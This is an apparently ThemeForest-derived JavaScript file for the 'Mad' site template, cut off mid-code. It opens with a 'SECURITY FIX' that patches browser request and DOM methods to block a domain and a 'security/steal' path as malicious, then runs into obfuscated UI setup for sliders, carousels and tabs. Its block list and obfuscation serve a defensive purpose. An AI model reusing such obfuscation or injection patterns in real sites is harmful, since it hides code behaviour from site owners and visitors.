// SECURITY FIX: Block malicious requests and iframe injections
(function() {
  // Block requests to malicious domains
  if (typeof XMLHttpRequest !== 'undefined') {
    var originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      if (url && (url.includes('velikorodnov.com') || url.includes('themeforest/security/steal'))) {
        console.log('Blocked XHR request to malicious domain:', url);
        return;
      }
      return originalOpen.apply(this, arguments);
    };
  }
  
  // Block fetch requests too
  if (typeof fetch !== 'undefined') {
    var originalFetch = window.fetch;
    window.fetch = function(url, options) {
      if (url && (url.includes('velikorodnov.com') || url.includes('themeforest/security/steal'))) {
        console.log('Blocked fetch request to malicious domain:', url);
        return Promise.reject('Blocked malicious request');
      }
      return originalFetch.apply(this, arguments);
    };
  }
  
  // Block iframe injection
  var originalDocumentWrite = document.write;
  document.write = function(content) {
    if (content && (content.includes('velikorodnov.com') || content.includes('security/steal'))) {
      console.log('Blocked malicious iframe injection');
      return;
    }
    return originalDocumentWrite.apply(document, arguments);
  };
  
  // Block script injection
  var originalCreateElement = document.createElement;
  document.createElement = function(tagName) {
    var element = originalCreateElement.call(document, tagName);
    if (tagName.toLowerCase() === 'iframe') {
      Object.defineProperty(element, 'src', {
        set: function(value) {
          if (value && (value.includes('velikorodnov.com') || value.includes('security/steal'))) {
            console.log('Blocked malicious iframe src:', value);
            return;
          }
          element.setAttribute('src', value);
        }
      });
    }
    return element;
  };
  
  // Ensure page shows immediately
  window.addEventListener('DOMContentLoaded', function() {
    document.getElementById('mad-page-wrapper').style.opacity = '1';
    document.getElementById('mad-page-wrapper').style.visibility = 'visible';
    document.querySelector('.mad-preloader').style.display = 'none';
  });
})();



var _0x2063ae = _0x381b;
function _0x381b(_0x5b9c2a, _0x22b60d) {
  var _0x49580f = _0x4958();
  return (
    (_0x381b = function (_0x381b9d, _0x91b49a) {
      _0x381b9d = _0x381b9d - 0x129;
      var _0x3acae1 = _0x49580f[_0x381b9d];
      return _0x3acae1;
    }),
    _0x381b(_0x5b9c2a, _0x22b60d)
  );
}
(function (_0x4ee378, _0x3533da) {
  var _0x39beab = _0x381b,
    _0x4a6c38 = _0x4ee378();
  while (!![]) {
    try {
      var _0x30d597 =
        -parseInt(_0x39beab(0x255)) / 0x1 +
        -parseInt(_0x39beab(0x167)) / 0x2 +
        -parseInt(_0x39beab(0x1af)) / 0x3 +
        (parseInt(_0x39beab(0x239)) / 0x4) *
          (parseInt(_0x39beab(0x35f)) / 0x5) +
        -parseInt(_0x39beab(0x285)) / 0x6 +
        (-parseInt(_0x39beab(0x170)) / 0x7) *
          (-parseInt(_0x39beab(0x176)) / 0x8) +
        (-parseInt(_0x39beab(0x2fa)) / 0x9) *
          (-parseInt(_0x39beab(0x12b)) / 0xa);
      if (_0x30d597 === _0x3533da) break;
      else _0x4a6c38["push"](_0x4a6c38["shift"]());
    } catch (_0xf300a9) {
      _0x4a6c38["push"](_0x4a6c38["shift"]());
    }
  }
})(_0x4958, 0x5b5dc);
var Mad = (function (_0x56c55d) {
  "use strict";
  var _0x363537 = _0x381b;
  var _0x4381fa = {},
    _0x2cceb6 = _0x56c55d[_0x363537(0x1e4)](),
    _0x4defa9 = _0x56c55d("body"),
    _0x455ae7 = _0x56c55d(document);
  ((_0x4381fa[_0x363537(0x130)] = {}),
    (_0x4381fa[_0x363537(0x23f)] = {}),
    (_0x4381fa["_localCache"] = {}),
    (_0x4381fa[_0x363537(0x186)] = Modernizr[_0x363537(0x2bf)]),
    (_0x4381fa["ANIMATIONDURATION"] = 0x1f4),
    (_0x4381fa[_0x363537(0x2aa)] = _0x363537(0x1d2)),
    (_0x4381fa[_0x363537(0x21c)] = Modernizr[_0x363537(0x21e)]),
    (_0x4381fa[_0x363537(0x345)] = _0x363537(0x1b2)),
    (_0x4381fa[_0x363537(0x319)] =
      getComputedStyle(document[_0x363537(0x1a4)])[_0x363537(0x32c)] ===
      _0x363537(0x32b)),
    (_0x4381fa["ISLEGACYBROWSER"] = !Modernizr[_0x363537(0x193)]),
    (_0x4381fa[_0x363537(0x23c)] =
      window[_0x363537(0x2d7)][_0x363537(0x2b8)][_0x363537(0x327)]("Firefox") !=
      -0x1),
    (_0x4381fa[_0x363537(0x34f)] = function () {
      var _0x4258bd = _0x363537,
        _0x4ef7e5 = this;
      if (this[_0x4258bd(0x23c)]) window[_0x4258bd(0x341)] = function () {};
      if (this["ISLEGACYBROWSER"]) {
        this[_0x4258bd(0x23f)][_0x4258bd(0x221)] &&
          this[_0x4258bd(0x23f)][_0x4258bd(0x221)]({
            before: _0x4258bd(0x30a),
            content: _0x4258bd(0x2bd),
          });
        if (this[_0x4258bd(0x130)]["preloader"])
          this["modules"][_0x4258bd(0x21a)]();
        return;
      }
      this["modules"]["backToTop"] &&
        this["modules"][_0x4258bd(0x269)]({
          easing: _0x4258bd(0x18a),
          speed: 0x226,
          cssPrefix: _0x4258bd(0x30c),
        });
      if (this["helpers"][_0x4258bd(0x135)])
        this[_0x4258bd(0x23f)][_0x4258bd(0x135)]();
      if (window[_0x4258bd(0x256)])
        window["MadEventsCalendar"]["init"](_0x56c55d(".mad-events-calendar"), {
          isTouch: _0x4ef7e5[_0x4258bd(0x186)],
          cssPrefix: _0x4258bd(0x30c),
          breakpoint: 0x300,
        });
      window[_0x4258bd(0x356)] &&
        new window[_0x4258bd(0x356)]({ cssPrefix: _0x4258bd(0x30c) });
      if (window[_0x4258bd(0x22d)]) {
        var _0x5dde69 = _0x56c55d(_0x4258bd(0x165));
        _0x5dde69[_0x4258bd(0x2c0)] &&
          new window[_0x4258bd(0x22d)](_0x5dde69, {
            animationEasing: _0x4ef7e5[_0x4258bd(0x2aa)],
            animationDuration: _0x4ef7e5[_0x4258bd(0x247)],
          });
      }
      if (this[_0x4258bd(0x130)][_0x4258bd(0x1fe)])
        this["modules"]["dropdown"]["init"]();
      if (this["modules"][_0x4258bd(0x35e)])
        this[_0x4258bd(0x130)][_0x4258bd(0x35e)]();
      if (this[_0x4258bd(0x130)]["hiddenSections"])
        this[_0x4258bd(0x130)]["hiddenSections"]();
      if (this[_0x4258bd(0x130)]["bgMove"]) this[_0x4258bd(0x130)]["bgMove"]();
      if (this[_0x4258bd(0x130)][_0x4258bd(0x22f)])
        this[_0x4258bd(0x130)]["viewTypes"]();
      if (this[_0x4258bd(0x23f)][_0x4258bd(0x2a9)])
        this["helpers"][_0x4258bd(0x2a9)]();
      var _0x235ad = _0x56c55d(_0x4258bd(0x339));
      _0x56c55d["fn"]["slider"] &&
        _0x235ad[_0x4258bd(0x2c0)] &&
        _0x235ad[_0x4258bd(0x349)]({
          range: !![],
          min: 0x0,
          max: 0x1f3,
          values: [0x2d, 0x12b],
          slide: function (_0x36287e, _0x4c03b1) {
            var _0x39cc23 = _0x4258bd,
              _0x15646e = _0x56c55d(_0x4c03b1["handle"])["closest"](
                _0x39cc23(0x339),
              ),
              _0x5a9706 = _0x15646e["siblings"](_0x39cc23(0x2c4));
            _0x15646e[_0x39cc23(0x2c0)] &&
              _0x5a9706[_0x39cc23(0x2c0)] &&
              _0x5a9706[_0x39cc23(0x2cd)](
                _0x39cc23(0x261),
                "$" +
                  _0x15646e["slider"](_0x39cc23(0x288), 0x0) +
                  _0x39cc23(0x1da) +
                  "$" +
                  _0x15646e[_0x39cc23(0x349)](_0x39cc23(0x288), 0x1),
              )[_0x39cc23(0x1ed)](
                _0x39cc23(0x335) +
                  "$" +
                  _0x15646e[_0x39cc23(0x349)](_0x39cc23(0x288), 0x0) +
                  _0x39cc23(0x230) +
                  _0x39cc23(0x1da) +
                  "$" +
                  _0x15646e[_0x39cc23(0x349)](_0x39cc23(0x288), 0x1) +
                  _0x39cc23(0x230),
              );
          },
        });
      var _0x2e6ab2 = _0x56c55d(_0x4258bd(0x33a));
      _0x2e6ab2[_0x4258bd(0x2c0)] &&
        _0x2e6ab2[_0x4258bd(0x223)]({ cssPrefix: "mad-" });
      var _0x252a53 = _0x56c55d(_0x4258bd(0x1c1));
      _0x252a53[_0x4258bd(0x2c0)] &&
        window[_0x4258bd(0x1c3)] &&
        window[_0x4258bd(0x1c3)](_0x252a53);
      var _0xf617e2 = _0x56c55d(_0x4258bd(0x231));
      _0xf617e2[_0x4258bd(0x2c0)] &&
        window[_0x4258bd(0x28e)] &&
        MadContactForm["init"](_0xf617e2);
      _0x56c55d[_0x4258bd(0x22a)] &&
        _0x56c55d["fancybox"]["defaults"] &&
        _0x56c55d["extend"](_0x56c55d[_0x4258bd(0x22a)][_0x4258bd(0x2b9)], {
          transitionEffect: _0x4258bd(0x25f),
          transitionDuration: _0x4ef7e5[_0x4258bd(0x247)],
          animationDuration: _0x4ef7e5["ANIMATIONDURATION"],
        });
      if (this["modules"][_0x4258bd(0x2b2)])
        this[_0x4258bd(0x130)][_0x4258bd(0x2b2)][_0x4258bd(0x308)](
          _0x56c55d(_0x4258bd(0x30e)),
        );
      var _0x2c2f2d = _0x56c55d(_0x4258bd(0x218)),
        _0x3e004e = _0x56c55d(_0x4258bd(0x142));
      _0x2c2f2d[_0x4258bd(0x2c0)] &&
        _0x2c2f2d[_0x4258bd(0x2c5)]({
          cssPrefix: _0x4258bd(0x30c),
          mobileBreakpoint: 0x4b0,
        });
      _0x3e004e[_0x4258bd(0x2c0)] &&
        _0x3e004e[_0x4258bd(0x2c5)]({
          cssPrefix: "mad-",
          mobileBreakpoint: 0x2710,
        });
      _0x56c55d(_0x4258bd(0x220))["on"](_0x4258bd(0x1c4), function (_0x115db4) {
        _0x115db4["preventDefault"];
      });
      var _0x5210e0 = _0x56c55d(_0x4258bd(0x1d7));
      _0x5210e0[_0x4258bd(0x2c0)] &&
        _0x5210e0[_0x4258bd(0x24d)](function () {
          var _0x1356fd = _0x4258bd,
            _0x5224bb = _0x56c55d(this),
            _0x5519bb = _0x5224bb[_0x1356fd(0x2ab)](),
            _0x4be8d1 = new Date(
              _0x5519bb[_0x1356fd(0x31b)],
              _0x5519bb[_0x1356fd(0x12c)] || 0x0,
              _0x5519bb[_0x1356fd(0x1fb)] || 0x1,
              _0x5519bb[_0x1356fd(0x13e)] || 0x0,
              _0x5519bb[_0x1356fd(0x209)] || 0x0,
              _0x5519bb[_0x1356fd(0x236)] || 0x0,
            );
          _0x5224bb[_0x1356fd(0x2ef)]({
            until: _0x4be8d1,
            padZeroes: !![],
            format: "dHMS",
            labels: [
              _0x1356fd(0x31d),
              "Month",
              _0x1356fd(0x337),
              _0x1356fd(0x2c3),
              _0x1356fd(0x272),
              _0x1356fd(0x334),
              _0x1356fd(0x20c),
            ],
            labels1: [
              "Years",
              "Month",
              _0x1356fd(0x337),
              _0x1356fd(0x2c3),
              "Hours",
              _0x1356fd(0x334),
              _0x1356fd(0x20c),
            ],
          });
        });
      var _0x1b39a4 = _0x56c55d(_0x4258bd(0x315)),
        _0x938095;
      _0x1b39a4[_0x4258bd(0x2c0)] &&
        _0x56c55d["fn"][_0x4258bd(0x148)] &&
        (_0x938095 = _0x1b39a4[_0x4258bd(0x192)]()[_0x4258bd(0x148)]({
          dottedOverlay: _0x4258bd(0x232),
          disableProgressBar: "on",
          spinner: _0x4258bd(0x2df),
          gridwidth: [0x5d0, 0x400, 0x400, 0x244],
          gridheight: [0x428, 0x428, 0x428, 0x428],
          responsiveLevels: [0x5a0, 0x400, 0x334, 0x244],
          navigation: {
            keyboardNavigation: "on",
            keyboard_direction: _0x4258bd(0x228),
            onHoverStop: _0x4258bd(0x22b),
            arrows: { enable: ![] },
            bullets: {
              enable: !![],
              style: _0x4258bd(0x232),
              hide_onleave: ![],
              h_align: _0x4258bd(0x19b),
              v_align: _0x4258bd(0x202),
              direction: _0x4258bd(0x331),
              h_offset: 0x0,
              v_offset: 0x28,
            },
          },
        }));
      _0x56c55d(_0x4258bd(0x27e))[_0x4258bd(0x2c0)] &&
        (jQuery(_0x4258bd(0x27e))[_0x4258bd(0x148)]({
          sliderType: _0x4258bd(0x12e),
          spinner: _0x4258bd(0x2df),
          delay: 0x1770,
          sliderLayout: _0x4258bd(0x233),
          stopLoop: "on",
          stopAfterLoops: 0x0,
          stopAtSlide: 0x1,
          navigation: {
            mouseScrollNavigation: "on",
            mouseScrollReverse: _0x4258bd(0x318),
            onHoverStop: _0x4258bd(0x2db),
            touch: {
              touchenabled: "on",
              swipe_threshold: 0x4b,
              swipe_min_touches: 0x32,
              swipe_direction: _0x4258bd(0x2f6),
              drag_block_vertical: ![],
            },
            bullets: {
              style: "",
              enable: !![],
              container: "slider",
              hide_onmobile: ![],
              hide_onleave: ![],
              hide_delay: 0xc8,
              hide_under: 0x0,
              hide_over: 0x270f,
              direction: _0x4258bd(0x2f6),
              space: -0x10,
              h_align: "right",
              v_align: _0x4258bd(0x19b),
              h_offset: 0x40,
            },
          },
        }),
        _0x56c55d(_0x4258bd(0x27e))["on"](
          _0x4258bd(0x324),
          function (_0x5249f5) {
            var _0x39c284 = _0x4258bd;
            _0x56c55d("#wheel")[_0x39c284(0x1a6)]("slow");
          },
        ));
      var _0x9d157d = _0x56c55d(_0x4258bd(0x267)),
        _0xfabac5 = _0x56c55d(_0x4258bd(0x2ca));
      _0x9d157d[_0x4258bd(0x2c0)] &&
        _0x9d157d[_0x4258bd(0x2fb)]({
          easing: _0x4ef7e5[_0x4258bd(0x2aa)],
          speed: _0x4ef7e5[_0x4258bd(0x247)],
          cssPrefix: _0x4258bd(0x30c),
        });
      _0xfabac5[_0x4258bd(0x2c0)] &&
        _0xfabac5[_0x4258bd(0x2fb)]({
          easing: _0x4ef7e5[_0x4258bd(0x2aa)],
          speed: _0x4ef7e5[_0x4258bd(0x247)],
          toggle: !![],
          cssPrefix: _0x4258bd(0x30c),
        });
      var _0x359717 = _0x56c55d(_0x4258bd(0x27a));
      _0x359717[_0x4258bd(0x1d6)](_0x4258bd(0x249))[_0x4258bd(0x2c0)] &&
        MadAlertBox[_0x4258bd(0x308)](
          _0x359717[_0x4258bd(0x1d6)](".mad-alert-box--success"),
          {
            duration: _0x4ef7e5[_0x4258bd(0x247)],
            cssPrefix: _0x4258bd(0x30c),
            easing: _0x4ef7e5["ANIMATIONEASING"],
            type: "success",
          },
        );
      _0x359717["filter"](".mad-alert-box--warning")[_0x4258bd(0x2c0)] &&
        MadAlertBox[_0x4258bd(0x308)](_0x359717["filter"](_0x4258bd(0x33e)), {
          duration: _0x4ef7e5[_0x4258bd(0x247)],
          cssPrefix: _0x4258bd(0x30c),
          easing: _0x4ef7e5["ANIMATIONEASING"],
          type: _0x4258bd(0x235),
        });
      _0x359717[_0x4258bd(0x1d6)](_0x4258bd(0x175))[_0x4258bd(0x2c0)] &&
        MadAlertBox[_0x4258bd(0x308)](
          _0x359717[_0x4258bd(0x1d6)](_0x4258bd(0x175)),
          {
            duration: _0x4ef7e5[_0x4258bd(0x247)],
            cssPrefix: _0x4258bd(0x30c),
            easing: _0x4ef7e5[_0x4258bd(0x2aa)],
            type: _0x4258bd(0x25e),
          },
        );
      _0x359717[_0x4258bd(0x1d6)](_0x4258bd(0x18c))["length"] &&
        MadAlertBox[_0x4258bd(0x308)](
          _0x359717[_0x4258bd(0x1d6)](".mad-alert-box--error"),
          {
            duration: _0x4ef7e5[_0x4258bd(0x247)],
            cssPrefix: _0x4258bd(0x30c),
            easing: _0x4ef7e5[_0x4258bd(0x2aa)],
            type: _0x4258bd(0x174),
          },
        );
      _0x56c55d("[data-tooltip]")[_0x4258bd(0x2c0)] &&
        _0x56c55d["fn"][_0x4258bd(0x13f)] &&
        _0x56c55d("[data-tooltip]")[_0x4258bd(0x13f)]({
          animationIn: "fadeInDown",
          animationOut: _0x4258bd(0x27b),
          tooltipPosition: _0x4258bd(0x1de),
          jQueryAnimationEasing: _0x4ef7e5[_0x4258bd(0x2aa)],
          jQueryAnimationDuration: _0x4ef7e5[_0x4258bd(0x247)],
          skin: _0x4258bd(0x232),
        });
      var _0x1bcd65 = _0x56c55d(_0x4258bd(0x1c5));
      _0x1bcd65["length"] &&
        this[_0x4258bd(0x23f)][_0x4258bd(0x2b5)] &&
        this[_0x4258bd(0x23f)][_0x4258bd(0x2b5)](_0x1bcd65);
      if (_0x56c55d(_0x4258bd(0x191))[_0x4258bd(0x2c0)])
        this[_0x4258bd(0x23f)][_0x4258bd(0x1db)]();
      var _0x426790 = _0x56c55d(".mad-simple-slideshow");
      _0x426790["length"] &&
        _0x56c55d["fn"][_0x4258bd(0x129)] &&
        _0x426790[_0x4258bd(0x24d)](function (_0x184103, _0x1791ff) {
          var _0x3c5525 = _0x4258bd,
            _0x2a6562 = _0x56c55d(_0x1791ff),
            _0x2b5708 = _0x2a6562["closest"](_0x3c5525(0x2d9));
          _0x2b5708[_0x3c5525(0x2c0)]
            ? _0x2b5708[_0x3c5525(0x24d)](function (_0x1b0e34, _0x1000a4) {
                var _0x42164c = _0x3c5525;
                _0x56c55d(_0x1000a4)["on"](_0x42164c(0x200), function () {
                  var _0x4fffea = _0x42164c;
                  _0x2a6562["owlCarousel"](
                    _0x4ef7e5[_0x4fffea(0x23f)][_0x4fffea(0x1d3)]({
                      margin: 0x1,
                      animateOut: "fadeOut",
                      loop: !![],
                      autoplay: _0x2a6562[_0x4fffea(0x307)](_0x4fffea(0x1e1)),
                    }),
                  );
                });
              })
            : _0x2a6562[_0x3c5525(0x129)](
                _0x4ef7e5[_0x3c5525(0x23f)][_0x3c5525(0x1d3)]({
                  margin: 0x1,
                  animateOut: _0x3c5525(0x1a6),
                  loop: !![],
                  autoplay: _0x2a6562[_0x3c5525(0x307)](
                    "mad-simple-slideshow--autoplay",
                  ),
                }),
              );
        });
      (this[_0x4258bd(0x23f)][_0x4258bd(0x254)][_0x4258bd(0x17e)](
        _0x4258bd(0x17f),
        {
          responsive: {
            0x0: { items: 0x2 },
            0x1e0: { items: 0x3 },
            0x4b0: { items: 0x6 },
            0x514: { items: 0x6 },
          },
        },
      ),
        this[_0x4258bd(0x23f)][_0x4258bd(0x254)][_0x4258bd(0x17e)](
          _0x4258bd(0x2fc),
          { autoplay: !![], loop: !![], autoHeight: !![] },
        ),
        this[_0x4258bd(0x23f)]["gridOwl"][_0x4258bd(0x17e)](_0x4258bd(0x21b), {
          loop: ![],
        }),
        this["helpers"]["gridOwl"][_0x4258bd(0x17e)](_0x4258bd(0x1f3), {
          margin: 0x8,
          responsive: {
            0x0: { items: 0x1 },
            0x1e0: { items: 0x2 },
            0x3e0: { items: 0x2 },
            0x400: { items: 0x3 },
            0x514: { items: 0x4 },
          },
        }),
        this["helpers"][_0x4258bd(0x254)]["extendConfigFor"](
          ".mad-owl-center",
          {
            center: !![],
            responsive: {
              0x17c: { items: 0x1 },
              0x1e0: { items: 0x1 },
              0x4b0: { items: 0x1 },
              0x514: { items: 0x2 },
            },
          },
        ),
        this["helpers"][_0x4258bd(0x254)][_0x4258bd(0x17e)](_0x4258bd(0x2d4), {
          responsive: {
            0x17c: { items: 0x1 },
            0x301: { items: 0x2 },
            0x4b0: { items: 0x2 },
            0x514: { items: 0x2 },
          },
        }),
        this[_0x4258bd(0x23f)][_0x4258bd(0x254)][_0x4258bd(0x17e)](
          _0x4258bd(0x325),
          {
            responsive: {
              0x17c: { items: 0x1 },
              0x301: { items: 0x2 },
              0x4b0: { items: 0x2 },
              0x514: { items: 0x3 },
            },
          },
        ),
        this[_0x4258bd(0x23f)]["gridOwl"][_0x4258bd(0x17e)](_0x4258bd(0x35d), {
          margin: 0x10,
          loop: ![],
          responsive: {
            0x17c: { items: 0x2 },
            0x1e0: { items: 0x2 },
            0x300: { items: 0x3 },
            0x400: { items: 0x3 },
            0x4b0: { items: 0x3 },
            0x514: { items: 0x3 },
          },
        }),
        this["helpers"][_0x4258bd(0x254)][_0x4258bd(0x17e)](
          ".mad-product-thumbs.mad-grid--cols-4",
          {
            margin: 0x10,
            loop: ![],
            responsive: {
              0x17c: { items: 0x2 },
              0x1e0: { items: 0x2 },
              0x300: { items: 0x3 },
              0x400: { items: 0x3 },
              0x4b0: { items: 0x4 },
              0x514: { items: 0x4 },
            },
          },
        ),
        this[_0x4258bd(0x23f)][_0x4258bd(0x254)][_0x4258bd(0x17e)](
          _0x4258bd(0x20b),
          { mouseDrag: ![], touchDrag: ![], autoHeight: !![], loop: ![] },
        ),
        _0x56c55d("[class*=\x22mad-section--stretched-content\x22]")["on"](
          _0x4258bd(0x200),
          function (_0x29c5bc, _0x5261fc) {
            var _0x3fc054 = _0x4258bd,
              _0x1f609b = _0x5261fc[_0x3fc054(0x1bd)](_0x3fc054(0x299)),
              _0x5dcb03 = _0x5261fc[_0x3fc054(0x1bd)](
                ".mad-simple-slideshow-thumbs.owl-carousel",
              );
            if (_0x1f609b[_0x3fc054(0x2c0)])
              _0x4ef7e5[_0x3fc054(0x23f)][_0x3fc054(0x254)][_0x3fc054(0x184)](
                _0x1f609b,
              );
            _0x5dcb03[_0x3fc054(0x2c0)] &&
              _0x5dcb03["owlCarousel"](
                _0x4ef7e5[_0x3fc054(0x23f)][_0x3fc054(0x1d3)]({
                  responsive: {
                    0x0: { items: 0x2 },
                    0x17c: { items: 0x3 },
                    0x3e0: { items: 0x4 },
                    0x4b0: { items: 0x6 },
                  },
                  margin: 0xa,
                  loop: ![],
                }),
              );
          },
        ));
      var _0x413760 = _0x56c55d(_0x4258bd(0x182))[_0x4258bd(0x1d6)](
        function (_0xdc38fb, _0x435cf8) {
          var _0x3f25e3 = _0x4258bd;
          return !_0x56c55d(_0x435cf8)[_0x3f25e3(0x292)](_0x3f25e3(0x32e))[
            _0x3f25e3(0x2c0)
          ];
        },
      );
      _0x413760[_0x4258bd(0x2c0)] &&
        _0x413760["owlCarousel"](
          _0x4ef7e5[_0x4258bd(0x23f)][_0x4258bd(0x1d3)]({
            responsive: {
              0x0: { items: 0x2 },
              0x17c: { items: 0x3 },
              0x3e0: { items: 0x4 },
              0x4b0: { items: 0x6 },
            },
            margin: 0xa,
            dots: !![],
            loop: ![],
          }),
        );
      (this[_0x4258bd(0x23f)][_0x4258bd(0x254)][_0x4258bd(0x184)](
        _0x56c55d(_0x4258bd(0x299))[_0x4258bd(0x1d6)](
          function (_0x812c4e, _0x3eeb84) {
            var _0x3ef642 = _0x4258bd;
            return !_0x56c55d(_0x3eeb84)[_0x3ef642(0x292)](_0x3ef642(0x32e))[
              "length"
            ];
          },
        ),
      ),
        this[_0x4258bd(0x23f)][_0x4258bd(0x274)][_0x4258bd(0x308)]());
      var _0x427e66 = _0x56c55d(_0x4258bd(0x2cf)),
        _0x24cf65;
      _0x427e66[_0x4258bd(0x2c0)] &&
        ((_0x24cf65 = _0x427e66[_0x4258bd(0x1bd)](_0x4258bd(0x309))),
        _0x24cf65[_0x4258bd(0x2c0)] &&
          _0x24cf65["on"](_0x4258bd(0x2c8), function (_0x4b3bcf, _0x481652) {
            var _0x770d0 = _0x4258bd,
              _0x464443 = _0x481652[_0x770d0(0x292)](".mad-tabs"),
              _0x3de514;
            if (_0x464443[_0x770d0(0x2c0)]) {
              _0x3de514 = _0x464443[_0x770d0(0x2ab)](_0x770d0(0x159));
              if (_0x3de514) _0x3de514["updateContainer"]();
            }
          }));
      if (this[_0x4258bd(0x23f)][_0x4258bd(0x161)])
        this[_0x4258bd(0x23f)][_0x4258bd(0x161)](_0x56c55d(_0x4258bd(0x25b)), {
          topLevelElements: _0x4258bd(0x2a2),
          bottomLevelElements: _0x4258bd(0x353),
        });
      if (this["helpers"]["rating"])
        this[_0x4258bd(0x23f)][_0x4258bd(0x161)](_0x56c55d(_0x4258bd(0x273)), {
          topLevelElements: _0x4258bd(0x2a2),
          bottomLevelElements: _0x4258bd(0x353),
        });
      if (this[_0x4258bd(0x23f)][_0x4258bd(0x2ed)])
        this[_0x4258bd(0x23f)][_0x4258bd(0x2ed)](_0x56c55d(_0x4258bd(0x2cf)));
      _0x2cceb6[_0x4258bd(0x24c)]();
    }),
    (_0x4381fa[_0x363537(0x244)] = function () {
      var _0x169297 = _0x363537,
        _0x2efd4b = this;
      if (this[_0x169297(0x1a3)]) return;
      var _0x720425 = _0x56c55d(_0x169297(0x31c));
      if (this[_0x169297(0x23f)][_0x169297(0x32f)])
        this[_0x169297(0x23f)][_0x169297(0x32f)][_0x169297(0x308)](
          _0x56c55d("[class*=\x22mad-colorizer--scheme-\x22]"),
        );
      this[_0x169297(0x130)][_0x169297(0x183)] &&
        _0x720425[_0x169297(0x2c0)] &&
        this["modules"][_0x169297(0x183)][_0x169297(0x308)](_0x720425);
      if (this[_0x169297(0x23f)][_0x169297(0x34d)])
        this["helpers"]["Breadcrumb"][_0x169297(0x308)](
          _0x56c55d(_0x169297(0x1b4)),
        );
      if (this[_0x169297(0x23f)][_0x169297(0x27f)])
        this["helpers"][_0x169297(0x27f)]["init"]({
          except: _0x56c55d(_0x169297(0x343))["add"](
            _0x56c55d(_0x169297(0x208)),
          ),
        });
      var _0x283987 = _0x56c55d(_0x169297(0x1c0));
      if (_0x283987[_0x169297(0x2c0)]) {
        (_0x283987[_0x169297(0x351)]({
          speed: _0x2efd4b[_0x169297(0x247)],
          easing: _0x2efd4b["ANIMATIONEASING"],
          cssPrefix: _0x169297(0x30c),
        }),
          _0x56c55d(_0x169297(0x321))["on"](_0x169297(0x1c4), function () {
            var _0x2b7aac = _0x169297;
            (_0x56c55d(".owl-carousel")[_0x2b7aac(0x316)](_0x2b7aac(0x1cd)),
              _0x56c55d(_0x2b7aac(0x1c6))[_0x2b7aac(0x12a)]({
                height: _0x56c55d(_0x2b7aac(0x141))[_0x2b7aac(0x2e2)]() + "px",
              }));
          }));
        var _0x1d6a7c = _0x56c55d(_0x169297(0x1c0))[_0x169297(0x2ab)]("tabs");
        _0x56c55d(_0x169297(0x1e2))["on"](_0x169297(0x1c4), function () {
          setTimeout(function () {
            var _0x3a5a33 = _0x381b;
            _0x1d6a7c[_0x3a5a33(0x13d)]();
          }, 0x12c);
        });
      }
      var _0x38d1f7 = _0x56c55d(".tabs-section");
      _0x38d1f7["length"] &&
        _0x38d1f7[_0x169297(0x159)]({
          active: 0x0,
          beforeActivate: function (_0x7b2b98, _0x4c9d6a) {
            var _0x309d44 = _0x169297,
              _0x35c91f = _0x4c9d6a[_0x309d44(0x132)]
                [_0x309d44(0x1bd)](_0x309d44(0x280))
                ["attr"]("href");
          },
          hide: { effect: _0x169297(0x1a6), duration: 0x1c2 },
          show: { effect: _0x169297(0x34b), duration: 0x1c2 },
          updateHash: ![],
        });
      if (this[_0x169297(0x130)][_0x169297(0x21a)])
        this[_0x169297(0x130)][_0x169297(0x21a)]();
      var _0x409d76 = _0x56c55d(_0x169297(0x217));
      _0x409d76["length"] && _0x409d76["parallax"](_0x169297(0x162), 0.4);
    }),
    (_0x4381fa["modules"][_0x363537(0x269)] = function (_0x3c74f9) {
      var _0x57feef = _0x363537,
        _0x1326b8 = {
          init: function (_0x27dd25) {
            var _0x2ab9a4 = _0x381b,
              _0x34ded5 = this;
            if (_0x27dd25)
              this[_0x2ab9a4(0x1ec)] = _0x56c55d[_0x2ab9a4(0x270)](
                this[_0x2ab9a4(0x1ec)],
                _0x27dd25,
              );
            ((this[_0x2ab9a4(0x355)] = _0x56c55d(_0x2ab9a4(0x18e), {
              class:
                _0x34ded5[_0x2ab9a4(0x1ec)][_0x2ab9a4(0x333)] +
                "back-to-top\x20animated\x20stealthy",
              html: _0x2ab9a4(0x260),
            })),
              this[_0x2ab9a4(0x250)](),
              _0x4defa9[_0x2ab9a4(0x279)](this[_0x2ab9a4(0x355)]));
          },
          config: {
            breakpoint: 0x2bc,
            showClass: _0x57feef(0x2f2),
            hideClass: _0x57feef(0x166),
            easing: _0x57feef(0x2cc),
            speed: 0x1f4,
            cssPrefix: "",
          },
          bindEvents: function () {
            var _0x44e58c = _0x57feef,
              _0x2fe3ee = _0x56c55d(_0x44e58c(0x2b1)),
              _0x26e306 = this;
            (this[_0x44e58c(0x355)]["on"](
              _0x44e58c(0x1c4),
              function (_0x207c52) {
                var _0x497594 = _0x44e58c;
                _0x2fe3ee[_0x497594(0x245)]()[_0x497594(0x1c8)](
                  { scrollTop: 0x0 },
                  {
                    easing: _0x26e306[_0x497594(0x1ec)][_0x497594(0x1ce)],
                    duration: _0x26e306[_0x497594(0x1ec)][_0x497594(0x1f4)],
                  },
                );
              },
            ),
              this["btn"]["on"](
                _0x4381fa[_0x44e58c(0x345)],
                function (_0x4282e8) {
                  var _0x1b0cb3 = _0x44e58c;
                  _0x4282e8[_0x1b0cb3(0x137)]();
                  var _0x2ce764 = _0x56c55d(this);
                  _0x2ce764["hasClass"](
                    _0x26e306[_0x1b0cb3(0x1ec)][_0x1b0cb3(0x1dd)],
                  ) &&
                    _0x2ce764["addClass"]("stealthy")[_0x1b0cb3(0x29f)](
                      _0x26e306[_0x1b0cb3(0x1ec)][_0x1b0cb3(0x1dd)] +
                        "\x20" +
                        _0x26e306[_0x1b0cb3(0x1ec)][_0x1b0cb3(0x333)] +
                        "inview",
                    );
                },
              ),
              _0x56c55d(window)["on"](
                _0x44e58c(0x19e),
                { self: this },
                this[_0x44e58c(0x1b6)],
              ));
          },
          toggleBtn: function (_0x2ec49f) {
            var _0x31626c = _0x57feef,
              _0x23bfe8 = _0x56c55d(this),
              _0x41b915 = _0x2ec49f[_0x31626c(0x2ab)]["self"];
            if (
              _0x23bfe8[_0x31626c(0x23e)]() >
                _0x41b915[_0x31626c(0x1ec)]["breakpoint"] &&
              !_0x41b915["btn"][_0x31626c(0x307)](
                _0x41b915[_0x31626c(0x1ec)][_0x31626c(0x333)] +
                  _0x31626c(0x2c7),
              )
            )
              (_0x41b915[_0x31626c(0x355)]
                [
                  _0x31626c(0x302)
                ](_0x41b915[_0x31626c(0x1ec)]["cssPrefix"] + _0x31626c(0x2c7))
